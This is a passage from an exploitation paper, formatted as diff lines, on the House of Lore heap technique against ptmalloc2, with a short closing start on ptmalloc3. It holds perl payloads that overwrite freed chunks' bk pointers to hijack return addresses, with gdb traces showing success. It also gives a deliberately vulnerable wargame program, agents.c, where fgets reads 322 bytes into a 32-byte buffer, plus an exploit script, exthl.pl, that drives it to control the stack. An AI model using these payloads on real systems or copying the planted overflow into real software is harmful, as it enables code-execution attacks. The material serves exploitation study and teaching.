+   if ( (victim = last(bin)) != bin)
+
+which is the same as:
+
+   if ( (victim = (bin-&gt;bk = oldvictim-&gt;bk)) != bin)
+
+will say that the last piece in the bin points to the bin itself, and
+therefore, the allocation must be extracted from another place.
+
+Until here all right, then, what do we need to exploit the program?
+
+1) Overwrite buff2-&gt;bk with an address on the stack near a saved return 
+   address (inside the frame created by func1( )).
+
+2) This address, in turn, must fall on a site such that the &quot;bk&quot; pointer of
+   this fake chunk will be an address with write permissions.
+
+3) The evil_func()'s address with which we want to overwrite EIP and the 
+   necessary padding to achieve the return address.
+
+Let's start with the basics:
+
+If we set a breakpoint in func1( ) and examine memory, we get:
+
+
+(gdb) x/16x $ebp-32
+0xbffff338:     0x00000000      0x00000000      0xbffff388      0x00743fc0
+0xbffff348:     0x00251340      0x00182a20      0x00000000      0x00000000
+0xbffff358:     0xbffff388      0x08048d1e      0x0804ffe8      0xbffff5d7
+0xbffff368:     0x0804c0b0      0xbffff388      0x0013f345      0x08050088
+
+EBP -&gt; 0xbffff358
+RET -&gt; 0xbffff35C
+
+
+But the important thing here is that we must alter buff2-&gt;bk with the
+&quot;0xbffff33c&quot; value so the new victim-&gt;bk take a writable address.
+
+Items 1 and 2 passed. The evil_func()'s address is:
+
+
+(gdb) disass evil_func
+Dump of assembler code for function evil_func:
+0x08048ba4 &lt;evil_func+0&gt;:       push   %ebp  
+
+
+And now, without further delay, let's see what happens when we merge all
+these elements into a single attack:
+
+
+black@odisea:~/ptmalloc2$ perl -e 'print &quot;BBBBBBBB&quot;. &quot;\xa4\x8b\x04\x08&quot;' &gt;
+evil.in
+
+...
+
+(gdb) run `perl -e 'print &quot;A&quot;x28 . &quot;\x3c\xf3\xff\xbf&quot;'` &lt; evil.in                                                                            
+
+[PTMALLOC2] -&gt; (Chunk from TOP)
+Buff1 -&gt; [ 0x804ffe8 ] 
+[PTMALLOC2] -&gt; (Chunk from TOP)
+Buff2 -&gt; [ 0x8050000 ] 
+[PTMALLOC2] -&gt; (Chunk from TOP)
+Buff3 -&gt; [ 0x8050088 ]         
+
+[PTMALLOC2] -&gt; (Freed and unsorted chunk [ 0x804fff8 ])
+[PTMALLOC2] -&gt; (Chunk from TOP)                                                
+Buff4 -&gt; [ 0x8050190 ]
+
+[PTMALLOC2] -&gt; (Smallbin code reached)
+[PTMALLOC2] -&gt; (victim = [ 0x804fff8 ])
+[PTMALLOC2] -&gt; (victim-&gt;bk = [ 0xbffff33c ]) // First stage of attack
+LB1 -&gt; [ 0x8050000 ]
+[PTMALLOC2] -&gt; (Smallbin code reached)
+[PTMALLOC2] -&gt; (victim = [ 0xbffff33c ])     // Victim in the stack
+[PTMALLOC2] -&gt; (victim-&gt;bk = [ 0xbffff378 ]) // Address with write perms
+
+LB2 -&gt; [ 0xbffff344 ]                        // Boom!
+Which is your favourite hobby?
+
+This is an evil function. You become a cool hacker if you are able to
+execute it.                                  // We get a cool msg.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048bb7 in evil_func ()
+(gdb)
+
+
+You must be starting to understand now what I wanted to explain in the 
+preface of this article, instead of discovering or inventing a new 
+technique, what we have been doing for a long time is to find the way to 
+design a vulnerable application to this technique which had fallen us from 
+the sky a few years ago.
+
+Compile this example with normal GLIBC and you will get the same result, 
+only remember adjusting evil_func( ) address or the area where you have
+stored your custom arbitrary code.
+
+
+
+               &lt;&lt; The unexamined life is not worth living. &gt;&gt;
+
+                                                 [ Socrates ]
+
+
+
+               .----------------------------.
+---[ 2.2.2 ---[   A More Confusing Example   ]---
+               .----------------------------.
+
+To understand how THoL could be applied in a real-life application, I 
+present below a source code created by me as if it were a game, that will
+offer a broader view of the attack.
+
+This is a crude imitation of an agent manager. The only thing this program
+can do is creating a new agent, editing it (ie edit their names and 
+descriptions) or deleting it. To save space, one could edit only certain 
+fields of an agent, leaving the other free without taking up memory or 
+freeing when no longer needed.
+
+In addition, to avoid unnecessary extensions in this paper, the entire
+information entered into the program is not saved in any database and only
+remains available while the application is in execution.
+
+
+---[ agents.c ]---
+
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void main_menu(void);
+
+void create_agent(void);
+void select_agent(void);
+void edit_agent(void);
+void delete_agent(void);
+
+void edit_name(void);
+void edit_lastname(void);
+void edit_desc(void);
+void delete_name(void);
+void delete_lastname(void);
+void delete_desc(void);
+void show_data_agent(void);
+
+typedef struct agent {
+   int id;
+   char *name;
+   char *lastname;
+   char *desc;
+} agent_t;
+
+agent_t *agents[256];
+int agent_count = 0;
+int sel_ag = 0;
+
+int main(int argc, char *argv[])
+{
+      main_menu();
+}
+
+void main_menu(void)
+{
+   int op = 0;
+   char opt[2];
+
+   printf(&quot;\n\t\t\t\t[1] Create new agent&quot;);
+   printf(&quot;\n\t\t\t\t[2] Select Agent&quot;);
+   printf(&quot;\n\t\t\t\t[3] Show Data Agent&quot;);
+   printf(&quot;\n\t\t\t\t[4] Edit agent&quot;);
+   printf(&quot;\n\t\t\t\t[0] &lt;- EXIT&quot;);
+   printf(&quot;\n\t\t\t\tSelect your option:&quot;);
+   fgets(opt, 3, stdin);
+
+   op = atoi(opt);
+   
+   switch (op) {
+	case 1:
+		create_agent();
+		break;
+	case 2:
+		select_agent();
+		break;
+	case 3:
+		show_data_agent();
+		break;
+	case 4:
+		edit_agent();
+		break;
+	case 0:
+           	 exit(0);
+    	default:
+	  	break;
+   }     
+
+   main_menu();
+}
+
+void create_agent(void)
+{
+   agents[agent_count] = (agent_t *) malloc(sizeof(agent_t));
+   sel_ag = agent_count;
+   agents[agent_count]-&gt;id = agent_count;
+   agents[agent_count]-&gt;name = NULL;
+   agents[agent_count]-&gt;lastname = NULL;
+   agents[agent_count]-&gt;desc = NULL;
+   printf(&quot;\nAgent %d created, now you can edit it&quot;, sel_ag);
+   agent_count += 1;
+}
+
+void select_agent(void)
+{
+   char ag_num[2];
+   int num;
+  
+   printf(&quot;\nWrite agent number: &quot;);
+   fgets(ag_num, 3, stdin);
+   num = atoi(ag_num);
+
+   if ( num &gt;= agent_count ) {
+       printf(&quot;\nOnly %d available agents, select another&quot;, agent_count);
+   } else {
+       sel_ag = num;
+       printf(&quot;\n[+] Agent %d selected.&quot;, sel_ag);
+   }
+}
+
+void show_data_agent(void)
+{
+   printf(&quot;\nAgent [%d]&quot;, agents[sel_ag]-&gt;id);
+
+   printf(&quot;\nName: &quot;); 
+   if(agents[sel_ag]-&gt;name != NULL)
+       printf(&quot;%s&quot;, agents[sel_ag]-&gt;name);
+
+   printf(&quot;\nLastname: &quot;);  
+   if(agents[sel_ag]-&gt;lastname != NULL)
+       printf(&quot;%s&quot;, agents[sel_ag]-&gt;lastname);
+   
+   printf(&quot;\nDescription: &quot;);
+   if(agents[sel_ag]-&gt;desc != NULL)
+       printf(&quot;%s&quot;, agents[sel_ag]-&gt;desc);
+}
+
+void edit_agent(void)
+{
+   int op = 0;
+   char opt[2];
+
+   printf(&quot;\n\t\t\t\t[1] Edit name&quot;);
+   printf(&quot;\n\t\t\t\t[2] Edit lastname&quot;);
+   printf(&quot;\n\t\t\t\t[3] Edit description&quot;);
+   printf(&quot;\n\t\t\t\t[4] Delete name&quot;);
+   printf(&quot;\n\t\t\t\t[5] Delete lastname&quot;);
+   printf(&quot;\n\t\t\t\t[6] Delete description&quot;);
+   printf(&quot;\n\t\t\t\t[7] Delete agent&quot;);
+   printf(&quot;\n\t\t\t\t[0] &lt;- MAIN MENU&quot;);
+   printf(&quot;\n\t\t\t\tSelect Agent Option: &quot;);
+   fgets(opt, 3, stdin);
+
+   op = atoi(opt);
+
+   switch (op) {
+      case 1:
+           edit_name();
+	   break;
+      case 2:
+           edit_lastname();
+           break;
+      case 3:
+           edit_desc();
+           break;
+      case 4:
+           delete_name();
+   	   break;
+      case 5:
+           delete_lastname();
+           break;
+      case 6:
+           delete_desc();
+           break;
+      case 7:
+           delete_agent();
+           break;
+      case 0:
+           main_menu();
+      default:
+         break;
+   }
+  
+   edit_agent();
+}
+
+void edit_name(void)
+{
+   if(agents[sel_ag]-&gt;name == NULL) {
+      agents[sel_ag]-&gt;name = (char *) malloc(32);
+      printf(&quot;\n[!!!]malloc(ed) name [ %p ]&quot;, agents[sel_ag]-&gt;name);
+   }
+
+   printf(&quot;\nWrite name for this agent: &quot;);
+   fgets(agents[sel_ag]-&gt;name, 322, stdin);
+}
+
+void delete_name(void)
+{
+   if(agents[sel_ag]-&gt;name != NULL) {
+      free(agents[sel_ag]-&gt;name);
+      agents[sel_ag]-&gt;name = NULL;
+   }
+}
+
+void edit_lastname(void)
+{
+   if(agents[sel_ag]-&gt;lastname == NULL) {
+      agents[sel_ag]-&gt;lastname = (char *) malloc(128);
+      printf(&quot;\n[!!!]malloc(ed) lastname [ %p ]&quot;,agents[sel_ag]-&gt;lastname);
+   }
+   
+   printf(&quot;\nWrite lastname for this agent: &quot;);
+   fgets(agents[sel_ag]-&gt;lastname, 127, stdin);
+}
+
+void delete_lastname(void)
+{
+   if(agents[sel_ag]-&gt;lastname != NULL) {
+      free(agents[sel_ag]-&gt;lastname);
+      agents[sel_ag]-&gt;lastname = NULL;
+   }
+}
+
+void edit_desc(void)
+{
+   if(agents[sel_ag]-&gt;desc == NULL) {
+      agents[sel_ag]-&gt;desc = (char *) malloc(256);
+      printf(&quot;\n[!!!]malloc(ed) desc [ %p ]&quot;, agents[sel_ag]-&gt;desc);
+   }
+
+   printf(&quot;\nWrite description for this agent: &quot;);
+   fgets(agents[sel_ag]-&gt;desc, 255, stdin);
+}
+
+void delete_desc(void)
+{
+   if(agents[sel_ag]-&gt;desc != NULL) {
+      free(agents[sel_ag]-&gt;desc);
+      agents[sel_ag]-&gt;desc = NULL;
+   }
+}
+
+void delete_agent(void)
+{
+    if (agents[sel_ag] != NULL) {
+        free(agents[sel_ag]);
+        agents[sel_ag] = NULL;
+    
+        printf(&quot;\n[+] Agent %d deleted\n&quot;, sel_ag);
+
+        if (sel_ag == 0) {
+            agent_count = 0;
+	      printf(&quot;\n[!] Empty list, please create new agents\n&quot;);
+        } else {
+	      sel_ag -= 1;
+            agent_count -= 1;
+	      printf(&quot;[+] Current agent selection: %d\n&quot;, sel_ag);
+        }
+    } else {
+        printf(&quot;\n[!] No agents to delete\n&quot;); 
+    }
+}
+
+---[ end agents.c ]---
+
+
+This is the perfect program that I would present in a wargame to those who 
+wish to apply the technique described in this paper.
+
+
+Someone might think that maybe this program is vulnerable to other 
+techniques described in the Malloc Des-Maleficarum. Indeed given the 
+ability of the user to manage the memory space, it may seem that The House 
+of Mind can be applied here, but one must see that the program limits us to
+the creation of 256 structures of type &quot;agent_t&quot;, and that the size of 
+these structures is about 432 bytes (approximately when you allocate all 
+its fields). If we multiply this number by 256 we get: (110592 = 0x1B000h) 
+which seems too small to let us achieve the desirable address &quot;0x08100000&quot; 
+necessary to corrupt the NON_MAIN_ARENA bit of an already allocated chunk 
+above that address (and thus create a fake arena in order to trigger the 
+attack aforementioned).
+
+Another technique that one would take as viable would be The House of Force
+since at first it is easy to corrupt the Wilderness (the Top Chunk), but
+remember that in order to apply this method one of the requirements is that
+the size of a call to malloc( ) must been defined by the designer with the
+main goal of corrupting &quot;av-&gt;top&quot;. This seems impossible here.
+
+Other techniques are also unworkable for several reasons, each due to their
+intrinsic requirements. So we must study how to sort the steps that trigger
+the vulnerability and the attack process that we have studied so far.
+
+Let's see in detail:
+
+After a quick look, we found that the only vulnerable function is:
+
+
+   void edit_name(void) {
+      ...
+         agents[sel_ag]-&gt;name = (char *) malloc(32);
+      ...
+      fgets(agents[sel_ag]-&gt;name, 322, stdin);
+
+
+At first it seems a simple typographical error, but it allows us to 
+override the memory chunk that we allocated after &quot;agents[]-&gt;name&quot;, which
+can be any, since the program allows practically a full control over 
+memory.
+
+To imitate the maximum possible vulnerable process shown in the previous
+section, the most obvious thing we can do to start is to create a new agent
+(0) and edit all fields. With this we get:
+
+
+   malloc(sizeof(agent_t));  // new agent
+   malloc(32);               // agents[0]-&gt;name
+   malloc(128);              // agents[0]-&gt;lastname
+   malloc(256);              // agents[0]-&gt;desc
+
+
+The main target is to overwrite the &quot;bk&quot; pointer in the field 
+&quot;agents[]-&gt;lastname&quot; if we have freed this chunk previously. Moreover, 
+between these two actions, we need to allocate a chunk of memory to be
+selected from the &quot;TOP code&quot;, so that the chunks present in the unsorted 
+bin are sorted in their corresponding bins for a later reuse.
+
+For this, what we do is create a new agent(1), select the first agent(0) 
+and delete its field &quot;lastname&quot;, select the second agent(1) and edit its
+description. This is equal to:
+
+
+   malloc(sizeof(agent_t));      // Get a chunk from TOP code      
+   free(agents[0]-&gt;lastname);    // Insert chunk at unsorted bin
+   malloc(256);                  // Get a chunk from TOP code
+
+
+After this last call to malloc( ), the freed chunk of 128 bytes (lastname)
+will have been placed in its corresponding bin. Now we can alter &quot;bk&quot; 
+pointer of this chunk, and for this we select again the first agent(0) and 
+edit its name (here there will be no call to malloc( ) since it has been 
+previously assigned).
+
+At this time, we can place a proper memory address pointing to the stack 
+and make two calls to malloc(128), first editing the &quot;lastname&quot; field of 
+the second agent(1) and then editing the &quot;lastname&quot; field of agent(0) one
+more time.
+
+These latest actions should return a memory pointer located in the stack in
+a position of your choice, and any written content on &quot;agents[0]-&gt;lastname&quot;
+could corrupt a saved return address.
+
+Without wishing to dwell too much more, we show here how a tiny-exploit 
+alter the above pointer &quot;bk&quot; and returns a chunk of memory located in the
+stack:
+
+
+---[ exthl.pl ]---
+
+#!/usr/bin/perl
+
+print &quot;1\n&quot; .              # Create agents[0]
+      &quot;4\n&quot; .              # Edit agents[0]
+      &quot;1\nblack\n&quot; .       # Edit name agents[0]
+      &quot;2\nngel\n&quot; .        # Edit lastname agents[0]
+      &quot;3\nsuperagent\n&quot; .  # Edit description agents[0]
+      &quot;0\n1\n&quot; .           # Create agents[1]
+      &quot;2\n0\n&quot; .           # Select agents[0]
+      &quot;4\n5\n&quot; .           # Delete lastname agents[0]
+      &quot;0\n2\n1\n&quot; .        # Select agents[1]
+      &quot;4\n&quot; .              # Edit agents[1]
+      &quot;3\nsupersuper\n&quot; .  # Edit description agents[1]
+      &quot;0\n2\n0\n&quot; .        # Select agents[0]
+      &quot;4\n&quot; .              # Edit agents[0]
+      &quot;1\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; .
+      &quot;\x94\xee\xff\xbf&quot; . # Edit name[0] and overwrite &quot;lastname-&gt;bk&quot;
+      &quot;\n0\n2\n1\n&quot; .      # Select agents[1]
+      &quot;4\n&quot; .              # Edit agents[1]
+      &quot;2\nother\n&quot; .       # Edit lastname agents[1]
+      &quot;0\n2\n0\n&quot; .        # Select agents[0]
+      &quot;4\n&quot; .              # Edit agents[0]
+      &quot;2\nBBBBBBBBBBBBBBBBBBBBB&quot; .
+      &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBB\n&quot;; # Edit lastname agents[0]
+                                        # and overwrite a {RET}
+
+---[ end exthl.pl ]---
+
+
+And here is the result, displaying only the outputs of interest for us:
+
+
+black@odisea:~/ptmalloc2$ ./exthl | ./agents
+.....      
+
+[PTMALLOC2] -&gt; (Smallbin code reached)              
+[PTMALLOC2] -&gt; (victim = [ 0x8 ])             // Create new agents[0]    
+Agent 0 created, now you can edit it                
+
+.....
+
+[PTMALLOC2] -&gt; (Chunk from TOP)                       
+[!!!]malloc(ed) name [ 0x804f020 ]            // Edit name agents[0]          
+Write name for this agent:                            
+
+.....
+
+[PTMALLOC2] -&gt; (Chunk from TOP)                       
+[!!!]malloc(ed) lastname [ 0x804f048 ]        // Edit lastname agents[0]
+Write lastname for this agent:                        
+
+.....
+  
+[PTMALLOC2] -&gt; (Chunk from TOP)                       
+[!!!]malloc(ed) desc [ 0x804f0d0 ]           // Edit description agents[0]                  
+Write description for this agent:                     
+
+.....
+  
+[PTMALLOC2] -&gt; (Chunk from TOP)                       
+Agent 1 created, now you can edit it         // Create new agents[1]
+         
+.....
+  
+Write agent number:                                   
+[+] Agent 0 selected.                        // Select agents[0]         
+
+.....
+ 
+[PTMALLOC2] -&gt; (Freed and unsorted [ 0x804f040 ] chunk) // Delete lastname
+
+.....
+  
+Write agent number:                                    
+[+] Agent 1 selected.                        // Select agents[1]           
+
+.....
+  
+[PTMALLOC2] -&gt; (Chunk from TOP)                        
+[!!!]malloc(ed) desc [ 0x804f1f0 ]           // Edit description agents[1]             
+Write description for this agent:                      
+
+.....
+
+Write agent number:                                    
+[+] Agent 0 selected.                        // Select agents[0] 
+
+.....
+  
+Write name for this agent:                   // Edit name agents[0]                     
+   
+Write agent number:                                    
+[+] Agent 1 selected.                        // Select agents[1]
+
+.....
+
+[PTMALLOC2] -&gt; (Smallbin code reached)                 
+[PTMALLOC2] -&gt; (victim = [ 0x804f048 ])                
+[PTMALLOC2] -&gt; (victim-&gt;bk = [ 0xbfffee94 ])           
+
+[!!!]malloc(ed) lastname [ 0x804f048 ]
+Write lastname for this agent:               // Edit lastname agents[1]
+
+.....
+ 
+Write agent number:                                   
+[+] Agent 0 selected.                        // Select agents[0]          
+
+.....
+
+[PTMALLOC2] -&gt; (Smallbin code reached)
+[PTMALLOC2] -&gt; (victim = [ 0xbfffee94 ])
+[PTMALLOC2] -&gt; (victim-&gt;bk = [ 0xbfffeec0 ])
+
+[!!!]malloc(ed) lastname [ 0xbfffee9c ]     // Edit lastname agents[0]
+Segmentation fault
+black@odisea:~/ptmalloc2$
+
+
+Everyone can predict what happened in the end, but GDB can clarify for us a
+few things:
+
+
+----- snip -----
+
+[PTMALLOC2] -&gt; (Smallbin code reached)
+[PTMALLOC2] -&gt; (victim = [ 0xbfffee94 ])
+[PTMALLOC2] -&gt; (victim-&gt;bk = [ 0xbfffeec0 ])
+
+[!!!]malloc(ed) lastname [ 0xbfffee9c ]
+
+Program received signal SIGSEGV, Segmentation fault.
+0x080490f6 in edit_lastname ()
+(gdb) x/i $eip
+0x80490f6 &lt;edit_lastname+150&gt;:  ret
+(gdb) x/8x $esp
+0xbfffee9c:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbfffeeac:     0x42424242      0x42424242      0x42424242      0x42424242
+(gdb)
+
+----- snip -----
+
+
+And you have moved to the next level of your favorite wargame, or at least
+you have increased your level of knowledge and skills. 
+
+Now, I encourage you to compile this program with your regular glibc (not
+static Ptmalloc2), and verify that the result is exactly the same, it does
+not change the inside code.
+
+I don't know if anyone had noticed, but another of the techniques that in 
+principle could be applied to this case is the forgotten The House of 
+Prime. The requirement for implementing it is the manipulation of the 
+header of two chunks that will be freed. This is possible since an overflow
+in agents[]-&gt;name can override both agents[]-&gt;lastname and agents[]-&gt;desc, 
+and we can decide both when freeing them and in what order. However, The 
+House of Prime needs also at least the possibility of placing an integer
+on the stack to overcome a last check and this is where it seems that we
+stay trapped. Also, remember that since glibc 2.3.6 one can no longer pass 
+to free( ) a chunk smaller than 16 bytes whereas this is the first 
+requirement inherent to this technique (alter the size field of the first 
+piece overwritten 0x9h = 0x8h + PREV_INUSE bit).
+
+
+
+               &lt;&lt; It is common sense to take a method and
+                  try it; if it fails, admit it frankly and
+                  try another. But above all, try something. &gt;&gt;
+
+                                      [ Franklin D. Roosevelt ]
+
+
+
+           .------------------------------.
+---[ 3 ---[   LargeBin Corruption Method   ]---
+           .------------------------------.
+
+In order to apply the method recently explained to a largebin we need the 
+same conditions, except that the size of the chunks allocated should be 
+above 512 bytes as seen above.
+
+However, in this case the code triggered in &quot;_int_malloc( )&quot; is different 
+and more complex. Extra requirements will be necessary in order to achieve 
+a successful execution of arbitrary code.
+
+We will make some minor modifications to the vulnerable program presented
+in 2.2.1 and will see, through the practice, which of these preconditions
+must be met.
+
+Here is the code:
+
+
+---[ thl-large.c ]---
+
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void evil_func(void)
+{
+    printf(&quot;\nThis is an evil function. You become a cool \
+              hacker if you are able to execute it\n&quot;); 
+}
+
+void func1(void)
+{
+    char *lb1, *lb2;
+     
+    lb1 = (char *) malloc(1536);
+    printf(&quot;\nLB1 -&gt; [ %p ]&quot;, lb1);
+    lb2 = malloc(1536);
+    printf(&quot;\nLB2 -&gt; [ %p ]&quot;, lb2);
+
+    strcpy(lb1, &quot;Which is your favourite hobby: &quot;);
+    printf(&quot;\n%s&quot;, lb1);
+    fgets(lb2, 128, stdin);
+}
+
+int main(int argc, char *argv[])
+{
+    char *buff1, *buff2, *buff3;
+
+    malloc(4096);
+    buff1 = (char *) malloc(1024);
+    printf(&quot;\nBuff1 -&gt; [ %p ]&quot;, buff1);
+    buff2 = (char *) malloc(2048);
+    printf(&quot;\nBuff2 -&gt; [ %p ]&quot;, buff2);
+    buff3 = (char *) malloc(4096);
+    printf(&quot;\nBuff3 -&gt; [ %p ]\n&quot;, buff3);
+
+    free(buff2);
+
+    printf(&quot;\nBuff4 -&gt; [ %p ]&quot;, malloc(4096));
+
+    strcpy(buff1, argv[1]);
+
+    func1();
+
+    return 0;
+}
+
+---[ end thl-large.c ]---
+
+
+As you can see, we still need an extra reserve (buff4) after releasing the 
+second allocated chunk. This is because it's not a good idea to have a 
+corrupted &quot;bk&quot; pointer in a chunk that still is in the unsorted bin. When 
+it happens, the program usually breaks sooner or later in the instructions:
+
+
+      /* remove from unsorted list */
+      unsorted_chunks(av)-&gt;bk = bck;
+      bck-&gt;fd = unsorted_chunks(av);
+
+
+But if we do not make anything wrong before the recently freed chunk is 
+placed in its corresponding bin, then we pass without penalty or glory the 
+next area code:
+
+
+    while ( (victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) {
+       ...
+    }
+
+
+Having passed this code means that (buff2) has been introduced in its 
+corresponding largebin. Therefore we will reach this code:
+
+
+----- snip -----
+
+    if (!in_smallbin_range(nb)) {
+      bin = bin_at(av, idx);
+
+      for (victim = last(bin); victim != bin; victim = victim-&gt;bk) {
+	size = chunksize(victim);
+
+	if ((unsigned long)(size) &gt;= (unsigned long)(nb)) {
+	  printf(&quot;\n[PTMALLOC2] No enter here please\n&quot;);
+	  remainder_size = size - nb;
+	  unlink(victim, bck, fwd);
+	  .....
+
+----- snip -----
+
+
+This does not look good. The unlink( ) macro is called, and we know the 
+associated protection since the 2.3.6 version of Glibc. Going there would 
+destroy all the work done until now.
+
+Here comes one of the first differences in the largebin corruption method. 
+In 2.2.1 we said that after overwriting the &quot;bk&quot; pointer of the free( ) 
+chunk, two calls to malloc( ) with the same size should be carried out to 
+return a pointer *mem in an arbitrary memory address.
+
+In largebin corruption, we must avoid this code at all cost. For this, the
+two calls to malloc( ) must be less than buff2-&gt;size. Phantasmal told us 
+&quot;512 &lt; M &lt; N&quot;, and that is what we see in our vulnerable application:
+512 &lt; 1536 &lt; 2048.
+
+As it has not previously been freed any chunk of this size (1536) or at 
+least belonging to the same bin, &quot;_int_malloc( )&quot; tries to search a chunk 
+that can fulfill the request from the next bin to the recently scanned:
+
+
+    // Search for a chunk by scanning bins, starting with next largest bin.
+
+    ++idx;
+    bin = bin_at(av,idx); 
+
+
+And here is where the magic comes, the following piece of code will be 
+executed:
+
+
+----- snip -----
+
+      victim = last(bin);
+      .....
+      else {
+        size = chunksize(victim);
+
+        remainder_size = size - nb;
+
+printf(&quot;\n[PTMALLOC2] -&gt; (Largebin code reached)&quot;);
+printf(&quot;\n[PTMALLOC2] -&gt; remander_size = size (%d) - nb (%d) = %u&quot;, size,
+                                                       nb, remainder_size);
+printf(&quot;\n[PTMALLOC2] -&gt; (victim = [ %p ])&quot;, victim);
+printf(&quot;\n[PTMALLOC2] -&gt; (victim-&gt;bk = [ %p ])\n&quot;, victim-&gt;bk);
+
+        /* unlink */
+        bck = victim-&gt;bk;
+        bin-&gt;bk = bck;
+        bck-&gt;fd = bin;
+
+        /* Exhaust */
+        if (remainder_size &lt; MINSIZE) {
+	  printf(&quot;\n[PTMALLOC2] -&gt; Exhaust code!! You win!\n&quot;);
+          .....
+          return chunk2mem(victim);
+        }
+
+        /* Split */
+        else {
+          .....
+          set_foot(remainder, remainder_size);
+          check_malloced_chunk(av, victim, nb);
+          return chunk2mem(victim);
+        }
+      }
+
+----- snip -----
+
+
+The code has been properly trimmed to show only the parts that have 
+relevance in the method we are describing. Calls to printf( ) are of my own
+and you will soon see its usefulness.
+
+Also it's easy to see that the process is practically the same as in the
+smallbin code. You take the last chunk of the respective largebin 
+(last(bin)) in &quot;victim&quot; and proceed to unlink it (without macro) before 
+reaching the user control. Since we control &quot;victim-&gt;bk&quot;, at first the
+attack requirements are the same, but then, where is the difference?
+
+Calling set_foot( ) tends to produce a segmentation fault since that
+&quot;remainder_size&quot; is calculated from &quot;victim-&gt;size&quot;, value that until now we
+were filling out with random data. The result is something like the 
+following:
+
+
+(gdb) run `perl -e 'print &quot;A&quot; x 1036 . &quot;\x44\xf0\xff\xbf&quot;'`                                                                                  
+
+[PTMALLOC2] -&gt; (Chunk from TOP)
+Buff1 -&gt; [ 0x8050010 ]
+[PTMALLOC2] -&gt; (Chunk from TOP)
+Buff2 -&gt; [ 0x8050418 ]
+[PTMALLOC2] -&gt; (Chunk from TOP)
+Buff3 -&gt; [ 0x8050c20 ]
+
+[PTMALLOC2] -&gt; (Freed and unsorted [ 0x8050410 ] chunk)
+[PTMALLOC2] -&gt; (Chunk from TOP)
+Buff4 -&gt; [ 0x8051c28 ]
+[PTMALLOC2] -&gt; (Largebin code reached)
+[PTMALLOC2] -&gt; remander_size = size (1094795584) - nb (1544) = 1094794040
+[PTMALLOC2] -&gt; (victim = [ 0x8050410 ])
+[PTMALLOC2] -&gt; (victim-&gt;bk = [ 0xbffff044 ])
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0804a072 in _int_malloc (av=0x804e0c0, bytes=1536) at malloc.c:4144
+4144              set_foot(remainder, remainder_size);
+(gdb)
+
+
+The solution is then enforce the conditional:
+
+   if (remainder_size &lt; MinSize) {
+      ...
+   }.
+
+Anyone might think of overwriting &quot;victim-&gt;size&quot; with a value like 
+&quot;0xfcfcfcfc&quot; which would generate as a result a negative number smaller 
+than MINSIZE, but we must remember that &quot;remainder_size&quot; is defined as an 
+&quot;unsigned long&quot; and therefore the result will always be a positive value.
+
+The only possibility that remains then is that the vulnerable application
+allows us to insert null bytes in the attack string, and therefore to 
+supply a value as (0x00000610 = 1552) that would generate: 
+1552 - 1544 (align) = 8 and the condition would be fulfilled. Let us see in
+action:
+
+
+(gdb) set *(0x08050410+4)=0x00000610        
+(gdb) c                                     
+Continuing.                                
+Buff4 -&gt; [ 0x8051c28 ]
+[PTMALLOC2] -&gt; (Largebin code reached)
+[PTMALLOC2] -&gt; remander_size = size (1552) - nb (1544) = 8
+[PTMALLOC2] -&gt; (victim = [ 0x8050410 ])
+[PTMALLOC2] -&gt; (victim-&gt;bk = [ 0xbffff044 ])
+
+[PTMALLOC2] -&gt; Exhaust code!! You win!
+
+LB1 -&gt; [ 0x8050418 ]
+[PTMALLOC2] -&gt; (Largebin code reached)
+[PTMALLOC2] -&gt; remander_size = size (-1073744384) - nb (1544) = 3221221368
+[PTMALLOC2] -&gt; (victim = [ 0xbffff044 ])
+[PTMALLOC2] -&gt; (victim-&gt;bk = [ 0xbffff651 ])
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0804a072 in _int_malloc (av=0x804e0c0, bytes=1536) at malloc.c:4144
+4144              set_foot(remainder, remainder_size);
+
+
+Perfect, we reached the second memory request where we saw that victim is
+equal to 0xbffff044 which being returned would provide a chunk whose *mem 
+pointes to the stack. However set_foot( ) again gives us problems, and this
+is obviously because we are not controlling the &quot;size&quot; field of this fake 
+chunk created on the stack.
+
+This is where we have to overcome the latter condition. Victim should point
+to a memory location containing user-controlled data, so that we can enter 
+an appropriate &quot;size&quot; value and conclude the technique.
+
+We end this section by saying that the largebin corruption method is not 
+just pure fantasy as we've made it a reality. However it is true that 
+finding the required preconditions of attack in real-life applications is
+almost impossible.
+
+As a curious note, one might try to overwrite &quot;victim-&gt;size&quot; with 
+0xffffffff (-1) and check that on this occasion set_foot( ) seems to follow
+its course without breaking the program.
+
+Note: Again we have not tested all versions of glibc, but we noted the
+following fixes in advanced versions:
+
+
+----- snip -----
+
+      else {
+        size = chunksize(victim);
+
+        /*  We know the first chunk in this bin is big enough to use. */
+        assert((unsigned long)(size) &gt;= (unsigned long)(nb));  &lt;-- !!!!!!!
+
+        remainder_size = size - nb;
+
+        /* unlink */
+        unlink(victim, bck, fwd);
+
+        /* Exhaust */
+        if (remainder_size &lt; MINSIZE) {
+          set_inuse_bit_at_offset(victim, size);
+          if (av != &amp;main_arena)
+            victim-&gt;size |= NON_MAIN_ARENA;
+        }
+
+        /* Split */
+        else {
+
+----- snip -----
+
+
+What this means is that the unlink( ) macro has been newly introduced into 
+the code, and thus the classic pointer testing mitigate the attack.
+
+
+
+               &lt;&lt; Insanity is doing the same
+                  thing over and over again, and
+                  expecting different results. &gt;&gt;
+
+                                   [ Albert Einstein ]
+
+
+
+           .-------------------------.
+---[ 4 ---[   Analysis of Ptmalloc3   ]---
+           .-------------------------.
+
+Delving into the internals of Ptmalloc3, without warm up, may seem violent,
+but with a little help it's only a child's game.
+
+In order to understand correctly the next sections, I present here the most
+notable differences in the code with respect to Ptmalloc2.
+
+The basic operation remains the same, in the end it's another common memory
+allocator, and is also based on a version of Doug Lea allocator but adapted
+to work on multiple threads.
+
+For example, here is the chunk definition:
+
+
+struct malloc_chunk {
+  size_t               prev_foot;  /* Size of previous chunk (if free).  */
+  size_t               head;       /* Size and inuse bits. */
+  struct malloc_chunk* fd;         /* double links -- used only if free. */
+  struct malloc_chunk* bk;
+};
+
+
